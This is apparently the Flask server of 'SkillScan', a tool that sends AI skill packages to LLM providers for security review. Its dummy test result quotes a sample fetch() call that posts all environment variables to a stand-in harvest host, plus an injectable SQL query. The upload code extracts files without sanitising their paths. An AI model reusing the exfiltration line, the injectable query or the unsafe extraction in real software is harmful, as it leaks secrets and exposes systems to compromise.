import os
import json
import urllib.request
import urllib.error
import tempfile
import zipfile
import threading
import webbrowser
import time
import uuid
import shutil
from pathlib import Path
from flask import Flask, request, jsonify, send_from_directory, render_template

from scanner import scan

app = Flask(__name__)

def load_config():
    config_path = Path('config.json')
    if config_path.exists():
        with open(config_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def load_scans():
    scans_path = Path('scans.json')
    if scans_path.exists():
        try:
            with open(scans_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_scans():
    with open('scans.json', 'w', encoding='utf-8') as f:
        json.dump(SCANS, f, indent=2)

SCANS = load_scans()

PROVIDERS = {
    "anthropic": {
        "url": "https://api.anthropic.com/v1/messages",
        "headers": lambda cfg: {
            "x-api-key": cfg.get("api_key", ""),
            "anthropic-version": "2023-06-01",
            "content-type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "max_tokens": 8000,
            "system": system,
            "messages": [{"role": "user", "content": user}]
        },
        "extract": lambda data: data["content"][0]["text"]
    },
    "openai": {
        "url": "https://api.openai.com/v1/chat/completions",
        "headers": lambda cfg: {
            "Authorization": f"Bearer {cfg.get('api_key', '')}",
            "Content-Type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "response_format": {"type": "json_object"}
        },
        "extract": lambda data: data["choices"][0]["message"]["content"]
    },
    "ollama": {
        "url": lambda cfg: f"{cfg.get('base_url', 'http://localhost:11434').rstrip('/')}/api/chat",
        "headers": lambda cfg: {
            "Content-Type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "stream": False,
            "format": "json"
        },
        "extract": lambda data: data["message"]["content"]
    },
    "openrouter": {
        "url": "https://openrouter.ai/api/v1/chat/completions",
        "headers": lambda cfg: {
            "Authorization": f"Bearer {cfg.get('api_key', '')}",
            "Content-Type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "response_format": {"type": {"type": "json_object"}}
        },
        "extract": lambda data: data["choices"][0]["message"]["content"]
    },
    "gemini": {
        "url": "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
        "headers": lambda cfg: {
            "Authorization": f"Bearer {cfg.get('api_key', '')}",
            "Content-Type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "response_format": {"type": "json_object"}
        },
        "extract": lambda data: data["choices"][0]["message"]["content"]
    }
}

def clean_json(raw: str) -> str:
    raw = raw.strip()
    if raw.startswith("```"):
        lines = raw.split("\n")
        lines = [l for l in lines if not l.strip().startswith("```")]
        raw = "\n".join(lines).strip()
    return raw

def call_ai(payload: str) -> dict:
    conf = load_config()
    provider_name = conf.get("provider", "anthropic")
    p_conf = conf.get(provider_name, {})
    model = p_conf.get("model", "claude-opus-4-6")
    
    provider = PROVIDERS.get(provider_name)
    if not provider:
        raise Exception(f"Unknown provider: {provider_name}")
        
    url = provider["url"](p_conf) if callable(provider["url"]) else provider["url"]
    headers = provider["headers"](p_conf)
    if "User-Agent" not in headers:
        headers["User-Agent"] = "SkillScanner/1.0 (Mozilla/5.0)"
    
    try:
        with open('prompt.md', 'r', encoding='utf-8') as f:
            system_prompt = f.read()
    except Exception:
        system_prompt = "Return raw JSON only."
        
    body_data = provider["body"](model, system_prompt, payload)
    data = json.dumps(body_data).encode('utf-8')
    
    req = urllib.request.Request(url, data=data, headers=headers, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=180) as response:
            resp_body = response.read().decode('utf-8')
            resp_data = json.loads(resp_body)
            raw_text = provider["extract"](resp_data)
            
            clean_text = clean_json(raw_text)
            return json.loads(clean_text)
    except urllib.error.HTTPError as e:
        error_body = e.read().decode('utf-8')
        raise Exception(f"HTTPError {e.code}: {error_body}")
    except Exception as e:
        raise Exception(f"AI API Error: {str(e)}")

def build_payload(scan_res: dict) -> str:
    parts = []
    parts.append("SKILL PACKAGE ANALYSIS REQUEST")
    parts.append("===============================")
    parts.append(f"Package: {scan_res.get('name', 'Unknown')}")
    parts.append(f"Input type: {scan_res.get('input_type', 'unknown')}")
    parts.append(f"Total readable files: {scan_res.get('readable_files', 0)}")
    parts.append(f"Skipped (binary/unreadable): {scan_res.get('skipped_files', 0)}")
    parts.append("\nFILE STRUCTURE:")
    parts.append(scan_res.get('file_tree', ''))
    
    skipped = scan_res.get('skipped', [])
    if skipped:
        parts.append("\nSKIPPED FILES (not sent — binary or unreadable):")
        for s in skipped:
            parts.append(f"- {s.get('relative_path')} ({s.get('reason')})")
            
    parts.append("\n===============================")
    parts.append("FILE CONTENTS:")
    parts.append("===============================\n")
    
    for f in scan_res.get('files', []):
        parts.append(f"--- FILE: {f.get('relative_path')} ({f.get('size_bytes')} bytes) ---")
        parts.append(f.get('content', ''))
        parts.append("\n")
        
    return "\n".join(parts)

def run_analysis_task(scan_id, path=None, is_folder=False, extract_dir=None, file_name=None):
    try:
        SCANS[scan_id]["status"] = "processing"
        
        target_path = path if path else extract_dir
        scan_res = scan(target_path)
        
        if not path and file_name:
            if is_folder and file_name != "Upload":
                scan_res['name'] = file_name
            elif not is_folder:
                dirs = os.listdir(extract_dir)
                if len(dirs) == 1 and os.path.isdir(os.path.join(extract_dir, dirs[0])):
                    scan_res['name'] = dirs[0]
                else:
                    scan_res['name'] = file_name
            
        payload = build_payload(scan_res)
        ai_res = call_ai(payload)
        
        for f in scan_res.get('files', []):
            if 'content' in f:
                del f['content']
                
        SCANS[scan_id]["result"] = ai_res
        SCANS[scan_id]["scan_summary"] = scan_res
        SCANS[scan_id]["status"] = "completed"
        save_scans()
    except Exception as e:
        SCANS[scan_id]["status"] = "error"
        SCANS[scan_id]["error"] = str(e)
        save_scans()
    finally:
        if extract_dir:
            try:
                shutil.rmtree(extract_dir)
            except:
                pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/results/<scan_id>')
def results_page(scan_id):
    return render_template('results.html')

@app.route('/api/scans', methods=['GET', 'DELETE'])
def handle_scans():
    if request.method == 'DELETE':
        SCANS.clear()
        save_scans()
        return jsonify({"success": True})
        
    history = []
    for s_id, data in SCANS.items():
        if data.get("status") in ["completed", "error"]:
            summary = data.get("scan_summary", {})
            result = data.get("result", {})
            history.append({
                "id": s_id,
                "name": data.get("name") or summary.get("name", "Unknown Analysis"),
                "status": data.get("status"),
                "timestamp": data.get("timestamp", 0),
                "verdict": result.get("verdict", "N/A"),
                "score": result.get("overall_score", 0)
            })
    history.sort(key=lambda x: x["timestamp"], reverse=True)
    return jsonify({"success": True, "history": history})

@app.route('/api/scan/<scan_id>', methods=['GET'])
def get_scan(scan_id):
    if scan_id not in SCANS:
        return jsonify({"success": False, "error": "Scan not found"}), 404
    return jsonify({"success": True, "data": SCANS[scan_id]})

@app.route('/api/scan/<scan_id>', methods=['PUT', 'DELETE'])
def modify_scan(scan_id):
    if scan_id not in SCANS:
        return jsonify({"success": False, "error": "Scan not found"}), 404
        
    if request.method == 'DELETE':
        del SCANS[scan_id]
        save_scans()
        return jsonify({"success": True})
        
    if request.method == 'PUT':
        data = request.json
        if data and "name" in data:
            SCANS[scan_id]["name"] = data["name"]
            save_scans()
            return jsonify({"success": True})
        return jsonify({"success": False, "error": "No name provided"}), 400

@app.route('/analyse', methods=['POST'])
def analyse():
    data = request.json
    if not data or 'path' not in data:
        return jsonify({"success": False, "error": "Missing path"}), 400
        
    path = data['path']
    if not os.path.exists(path):
        return jsonify({"success": False, "error": f"Path not found: {path}"}), 404
        
    scan_id = str(uuid.uuid4())
    SCANS[scan_id] = {
        "status": "pending", 
        "timestamp": time.time(),
        "name": os.path.basename(path) or path
    }
    save_scans()
    threading.Thread(target=run_analysis_task, args=(scan_id, path, False, None, None)).start()
    return jsonify({"success": True, "scan_id": scan_id})

@app.route('/analyse-zip', methods=['POST'])
def analyse_zip():
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "No file uploaded"}), 400
        
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "error": "No file selected"}), 400
        
    if not file.filename.lower().endswith('.zip'):
        return jsonify({"success": False, "error": "Must be a .zip file"}), 400
        
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, "uploaded.zip")
    extract_dir = os.path.join(temp_dir, "extracted")
    
    try:
        file.save(zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(extract_dir)
            
        scan_id = str(uuid.uuid4())
        SCANS[scan_id] = {
            "status": "pending",
            "timestamp": time.time(),
            "name": file.filename
        }
        save_scans()
        threading.Thread(target=run_analysis_task, args=(scan_id, None, False, extract_dir, file.filename)).start()
        return jsonify({"success": True, "scan_id": scan_id})
    except Exception as e:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/analyse-folder-upload', methods=['POST'])
def analyse_folder_upload():
    if 'files' not in request.files:
        return jsonify({"success": False, "error": "No files uploaded"}), 400
        
    files = request.files.getlist('files')
    if not files or files[0].filename == '':
        return jsonify({"success": False, "error": "No files selected"}), 400
        
    temp_dir = tempfile.mkdtemp()
    extract_dir = os.path.join(temp_dir, "uploaded_folder")
    os.makedirs(extract_dir, exist_ok=True)
    
    try:
        folder_name = "Upload"
        for file in files:
            if file.filename:
                path_parts = file.filename.split('/')
                if len(path_parts) > 1:
                    folder_name = path_parts[0]
                
                safe_path = os.path.join(extract_dir, file.filename)
                os.makedirs(os.path.dirname(safe_path), exist_ok=True)
                file.save(safe_path)
                
        scan_id = str(uuid.uuid4())
        SCANS[scan_id] = {
            "status": "pending",
            "timestamp": time.time(),
            "name": folder_name
        }
        save_scans()
        threading.Thread(target=run_analysis_task, args=(scan_id, None, True, extract_dir, folder_name)).start()
        return jsonify({"success": True, "scan_id": scan_id})
    except Exception as e:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/dummy', methods=['POST'])
def dummy_scan():
    scan_id = str(uuid.uuid4())
    SCANS[scan_id] = {
        "status": "pending",
        "timestamp": time.time(),
        "name": "Local Dummy Test"
    }
    save_scans()
    
    def set_dummy():
        time.sleep(3)
        SCANS[scan_id]["status"] = "completed"
        SCANS[scan_id]["scan_summary"] = {
            "name": "test-auth-package",
            "input_type": "folder",
            "readable_files": 8,
            "skipped_files": 2,
            "file_tree": "test-auth-package/\n├── SKILL.md\n├── _meta.json\n└── src/\n    ├── api.js\n    └── utils.js"
        }
        SCANS[scan_id]["result"] = {
            "package_name": "test-auth-package",
            "package_purpose": "A skill package claiming to handle user authentication and profile management.",
            "threat_level": "HIGH",
            "overall_score": 32,
            "verdict": "Suspicious",
            "summary": "This package contains multiple high-severity security threats. A hidden fetch call in utils.js sends harvested environment variables to an unknown external server. The SQL injection vulnerability could allow attackers to dump the entire database. Do NOT use in production without fixing all critical issues.",
            "safe_to_use": False,
            "threat_findings": [
                { "id": 1, "category": "data_exfiltration", "severity": "critical", "title": "Env vars sent to external server", "description": "utils.js contains a hidden fetch() call on line 47 that collects all process.env variables and POSTs them to https://collect.shady-analytics.io/harvest. This is data exfiltration of API keys and secrets.", "evidence": "fetch('https://collect.shady-analytics.io/harvest', {method:'POST', body: JSON.stringify(process.env)})", "location": "src/utils.js:47", "recommendation": "Remove this fetch call immediately. Audit what data may have already been exfiltrated." },
                { "id": 2, "category": "credential_theft", "severity": "critical", "title": "Hardcoded JWT with env harvest", "description": "The JWT secret is hardcoded as 'super_secret_key_123' which is trivially guessable. Combined with the env exfiltration, attackers could forge tokens.", "evidence": "const JWT_SECRET = 'super_secret_key_123'", "location": "src/utils.js:12", "recommendation": "Move JWT secret to environment variable. Use cryptographically random secret of at least 256 bits." },
                { "id": 3, "category": "suspicious_behavior", "severity": "high", "title": "SQL Injection in login endpoint", "description": "The login endpoint directly interpolates user input into SQL queries without parameterization, allowing attackers to bypass authentication or dump the database.", "evidence": "db.query(`SELECT * FROM users WHERE email='${req.body.email}'`)", "location": "src/api.js:23", "recommendation": "Use parameterized queries with prepared statements." },
                { "id": 4, "category": "insecure_communication", "severity": "medium", "title": "HTTP used instead of HTTPS", "description": "Internal API calls use HTTP protocol which can be intercepted via MITM attacks.", "evidence": "fetch('http://internal-api.example.com/data')", "location": "src/api.js:45", "recommendation": "Switch all internal API calls to HTTPS." }
            ],
            "network_analysis": {
                "outbound_connections": [
                    { "url": "https://collect.shady-analytics.io/harvest", "file": "src/utils.js", "purpose": "Exfiltrates all environment variables including API keys", "risk": "dangerous" },
                    { "url": "http://internal-api.example.com/data", "file": "src/api.js", "purpose": "Internal data fetch over insecure HTTP", "risk": "suspicious" }
                ],
                "data_sent_externally": "All process.env variables including API keys, database credentials, and JWT secrets are sent to an external server."
            },
            "file_risk_assessment": [
                { "path": "SKILL.md", "role": "Documentation", "risk_level": "safe", "threats_found": 0, "one_line": "Clean documentation file, no executable code." },
                { "path": "_meta.json", "role": "Metadata", "risk_level": "safe", "threats_found": 0, "one_line": "Standard metadata, no threats." },
                { "path": "src/api.js", "role": "API endpoints", "risk_level": "high_risk", "threats_found": 2, "one_line": "SQL injection and insecure HTTP connections detected." },
                { "path": "src/utils.js", "role": "Utility functions", "risk_level": "dangerous", "threats_found": 2, "one_line": "ACTIVE DATA EXFILTRATION and hardcoded credentials." }
            ],
            "permissions_analysis": {
                "file_system_access": [".env", "config.json"],
                "network_access": ["collect.shady-analytics.io", "internal-api.example.com"],
                "shell_execution": [],
                "environment_access": ["process.env (ALL variables)"],
                "excessive_permissions": True,
                "justification": "An auth package has no legitimate reason to harvest ALL environment variables and send them to an external analytics server."
            },
            "security_positives": [
                "SKILL.md documentation is clean and contains no executable code.",
                "File structure is logically organized."
            ],
            "remediation_priority": [
                { "step": 1, "action": "Remove data exfiltration fetch call in utils.js:47", "severity": "critical", "effort": "low", "why": "Active exfiltration of all env vars to unknown server." },
                { "step": 2, "action": "Replace hardcoded JWT secret with secure env variable", "severity": "critical", "effort": "low", "why": "Trivially guessable secret enables token forgery." },
                { "step": 3, "action": "Fix SQL injection in login endpoint", "severity": "high", "effort": "low", "why": "Allows full database compromise." },
                { "step": 4, "action": "Switch all HTTP calls to HTTPS", "severity": "medium", "effort": "low", "why": "Prevents man-in-the-middle attacks." }
            ],
            "stats": {
                "files_scanned": 4,
                "total_threats": 4,
                "critical": 2,
                "high": 1,
                "medium": 1,
                "low": 0,
                "info": 0,
                "safe_files": 2,
                "risky_files": 2
            }
        }
        save_scans()
        
    threading.Thread(target=set_dummy).start()
    return jsonify({"success": True, "scan_id": scan_id})
@app.route('/api/ollama-models')
def detect_ollama_models():
    """Auto-detect locally installed Ollama models by querying the Ollama API."""
    try:
        req = urllib.request.Request('http://localhost:11434/api/tags')
        req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode())
            models = [m['name'] for m in data.get('models', []) if 'name' in m]
            if models:
                return jsonify({"success": True, "models": models})
            return jsonify({"success": False, "models": [], "error": "No models found"})
    except Exception as e:
        return jsonify({"success": False, "models": [], "error": f"Ollama not reachable: {str(e)}"})

@app.route('/config', methods=['GET', 'POST'])
def handle_config():
    conf = load_config()
    if request.method == 'POST':
        data = request.json
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        provider = data.get("provider")
        model = data.get("model")
        
        if provider and provider in PROVIDERS:
            conf["provider"] = provider
            if model:
                if provider not in conf:
                    conf[provider] = {}
                conf[provider]["model"] = model
            
            with open('config.json', 'w', encoding='utf-8') as f:
                json.dump(conf, f, indent=2)
            return jsonify({"success": True})
        return jsonify({"success": False, "error": "Invalid provider"}), 400

    provider = conf.get("provider", "anthropic")
    model = conf.get(provider, {}).get("model", "unknown")
    
    # Return available options for UI dropdowns
    options = {
        "anthropic": ["claude-opus-4-6", "claude-sonnet-4-20250514", "claude-3-5-sonnet-20240620", "claude-3-opus-20240229", "claude-3-haiku-20240307"],
        "openai": ["gpt-4o", "gpt-4o-mini", "gpt-4-turbo", "gpt-4", "gpt-3.5-turbo", "o1-preview", "o1-mini"],
        "ollama": ["llama3.2", "llama3.1", "llama3", "mistral", "mixtral", "gemma2", "gemma", "qwen2.5", "phi3", "phi3:medium", "deepseek-coder", "codellama", "command-r", "nous-hermes2"],
        "openrouter": ["anthropic/claude-3.5-sonnet", "anthropic/claude-3-opus", "openai/gpt-4o", "google/gemini-pro-1.5", "meta-llama/llama-3-70b", "mistralai/mixtral-8x22b"],
        "gemini": ["gemini-2.5-pro", "gemini-2.5-flash", "gemini-2.0-pro-exp-02-05", "gemini-2.0-flash", "gemini-1.5-pro", "gemini-1.5-flash"]
    }
    
    return jsonify({
        "provider": provider, 
        "model": model,
        "options": options
    })

def open_browser():
    conf = load_config()
    server_conf = conf.get("server", {})
    host = server_conf.get("host", "localhost")
    port = server_conf.get("port", 5000)
    time.sleep(1.2)
    webbrowser.open_new(f"http://{host}:{port}")

if __name__ == '__main__':
    conf = load_config()
    provider = conf.get("provider", "anthropic")
    model = conf.get(provider, {}).get("model", "unknown")
    server_conf = conf.get("server", {})
    host = server_conf.get("host", "localhost")
    port = server_conf.get("port", 5000)
    
    url = f"http://{host}:{port}"
    print("╔══════════════════════════════════╗")
    print("║  SkillScan 🔍  v3.0              ║")
    print("║  AI Skill Package Analyser       ║")
    print("╠══════════════════════════════════╣")
    print(f"║  Provider : {provider.ljust(21)}║")
    print(f"║  Model    : {model.ljust(21)}║")
    print(f"║  URL      : {url.ljust(21)}║")
    print("╚══════════════════════════════════╝")
    
    threading.Thread(target=open_browser, daemon=True).start()
    app.run(host=host, port=port, debug=False, use_reloader=False)
